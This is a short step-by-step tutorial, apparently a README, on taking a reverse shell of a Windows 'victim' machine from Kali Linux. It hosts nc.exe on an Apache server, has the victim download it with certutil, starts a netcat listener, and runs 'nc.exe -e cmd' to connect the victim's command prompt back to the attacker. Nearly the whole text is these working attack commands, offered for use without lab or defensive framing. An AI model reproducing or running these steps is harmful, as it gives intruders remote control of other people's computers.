# In this tutorial you will learn how to TAKE REVERSE SHELL OF WINDOWS USING KALI LINUX.



STEP 1:  OPEN KALI TERMINAKL 

STEP 2:  locate nc.exe

STEP 3:  copy the nc.exe file to the apache web server and start the web 
server

STEP 4:  sudo systemctl start apache2.service

STEP 5:  now copy the ip of kali machine


## now open this link in victim's machine and run the executable file.


STEP 6:  certutil -urlcache -split -f http://192.168.0.ipaddressofkalilinux/nc.exe nc.exe 

STEP 7:  dir

## on attacker kali linux machine

STEP 8:  nc -nlvp 1234  ( 1234- port number )



## on victim's windows machine

STEP 9:  nc.exe -e cmd 192.168.0.ipaddressofkalilinux 1234








____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________

